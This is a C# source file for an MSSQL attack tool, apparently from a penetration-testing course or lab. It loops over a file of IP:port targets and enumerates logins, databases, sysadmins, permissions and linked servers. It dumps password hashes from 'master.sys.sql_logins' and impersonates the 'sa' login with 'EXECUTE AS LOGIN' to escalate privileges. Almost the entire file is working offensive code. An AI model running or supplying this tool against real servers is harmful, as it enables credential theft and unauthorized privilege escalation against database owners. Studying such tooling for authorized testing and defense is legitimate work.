using System;
using System.Data.SqlClient;
using System.IO;

namespace MSSQLAuthentication
{
    public class Program
    {
        public static String executeQuery(String query, SqlConnection con)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();
            try
            {
                String result = "";
                while (reader.Read() == true)
                {
                    result += reader[0] + "\n";
                }
                reader.Close();
                return result;
            }
            catch
            {
                return "";
            }
        }

        public static void getGroupMembership(String groupToCheck, SqlConnection con)
        {
            String res = executeQuery($"SELECT IS_SRVROLEMEMBER('{groupToCheck}');", con);
            int role = int.Parse(res);
            if (role == 1)
            {
                Console.WriteLine($"[+] User is a member of the '{groupToCheck}' group.");
            }
            else
            {
                Console.WriteLine($"[-] User is not a member of the '{groupToCheck}' group.");
            }
        }
        public static void Main(string[] args)
        {
            // Read IP and port from mapping file
            string[] mapping = File.ReadAllLines(args[0]);


            foreach (string line in mapping)
            {
                // Split the line into IP and port
                string[] parts = line.Split(new char[] { ' ' });

                string ip = line.Split(':')[0];
              //  string ip = Convert.ToString(line[0]);

                var port = line.Split(':')[1];
               // string port = Convert.ToString(line[1]);
                String database = "master";

                try
                {

                    // Connect to MSSQL server
                    //string connectionString = "Server=" + ip + "," + port + ";Database=mydb;User Id=myusername;Password=mypassword;";
                    Console.WriteLine("Server: " +ip + ";" + "Port: " + port);
                    String connectionString = "Server=" + ip + "," + port + "; Database = " + database + "; Integrated Security = True;";
                    SqlConnection con = new SqlConnection(connectionString);
                    con.Open();
                    Console.WriteLine("Authentication successful.");
                    String login = executeQuery("SELECT SYSTEM_USER;", con);
                    Console.WriteLine($"[*] Logged in as: {login}");
                    String uname = executeQuery("SELECT USER_NAME();", con);
                    Console.WriteLine($"[*] Database username: {uname}");
                    getGroupMembership("public", con);
                    getGroupMembership("sysadmin", con);

                    String curr_db = executeQuery("SELECT db_name();", con);
                    Console.WriteLine($"[*] Database name: {curr_db}");

                    String tables = executeQuery("select table_name from information_schema.tables;", con);
                    Console.WriteLine($"[*] tables: {tables}\n");

                    String dbs = executeQuery("select name from master..sysdatabases;", con);
                    Console.WriteLine($"[*] Databases: {dbs}\n");

                    String logins = executeQuery("Select* from sys.server_principals where type_desc != 'SERVER_ROLE';", con);
                    Console.WriteLine($"[*] LoggedIn users: {logins}\n");

                    String DBUsers = executeQuery(" Select* from sys.database_principals where type_desc != 'database_role';", con);
                    Console.WriteLine($"[*] LoggedIn DB users: {DBUsers}\n");

                    String sysadmins = executeQuery("SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;", con);
                    Console.WriteLine($"[*] All Sysadmins: {sysadmins}\n");

                    String hashes = executeQuery("SELECT name, password_hash FROM master.sys.sql_logins",con);
                    Console.WriteLine($"[*] Hashes: {hashes}\n");

                    String res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);

                    Console.WriteLine($"[*] User can impersonate the following logins: {res}.");

                    String su = executeQuery("SELECT SYSTEM_USER;", con);
                    String un = executeQuery("SELECT USER_NAME();", con);
                    Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
                    String res2 = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
                    Console.WriteLine($"[*] Triggered impersonation.");
                    su = executeQuery("SELECT SYSTEM_USER;", con);
                    un = executeQuery("SELECT USER_NAME();", con);
                    Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");

                    String res3 = executeQuery("EXEC sp_linkedservers;", con);
                    Console.WriteLine($"[*] Found linked servers: {res3}");

                    String perms = executeQuery("select * from fn_my_permissions(null, 'server');", con);
                    Console.WriteLine($"[*] Permissions on server: {perms}\n");

                    String perms2 = executeQuery("SELECT * FROM fn_my_permissions(NULL, 'DATABASE');", con);
                    Console.WriteLine($"[*] Permissions on server: {perms2}\n");
                }

                catch (SqlException e)
                {
                    Console.WriteLine("Authentication failed: " + e.Message);
                }

            }
        }
    }
}